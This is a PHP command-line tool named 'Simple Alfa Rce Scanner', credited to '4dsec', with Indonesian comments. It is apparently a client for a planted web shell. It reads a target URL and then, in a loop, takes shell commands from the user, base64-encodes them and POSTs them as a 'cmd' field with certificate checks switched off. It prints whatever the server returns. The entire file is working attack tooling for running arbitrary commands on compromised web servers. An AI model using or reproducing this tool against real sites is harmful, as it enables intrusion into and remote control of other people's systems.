<?php

echo "Simple Alfa Rce Scanner\n";
echo "Coded By 4dsec\n";
echo "Azathoth Project\n\n";

$site = readline("Site: ");

while (true) {

    $command = readline("Command: ");

    // Encode command ke Base64
    $encoded = base64_encode($command);

    // Data POST
    $postData = [
        'cmd' => $encoded
    ];

    // Inisialisasi cURL
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $site);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "Error: " . curl_error($ch) . PHP_EOL;
        curl_close($ch);
        break;
    }

    curl_close($ch);

    // Menghapus tag <pre> jika ada
    $result = str_replace(
        ["<pre>", "</pre>"],
        "",
        $response
    );

    if (trim($result) != "") {
        echo "\n===== OUTPUT =====\n";
        echo $result . PHP_EOL;
        echo "==================\n";
    } else {
        echo "Mungkin cmd salah / target tidak vulnerable.\n";
    }

    $again = strtolower(readline("Lanjut? (y/n): "));
    if ($again !== "y") {
        break;
    }
}
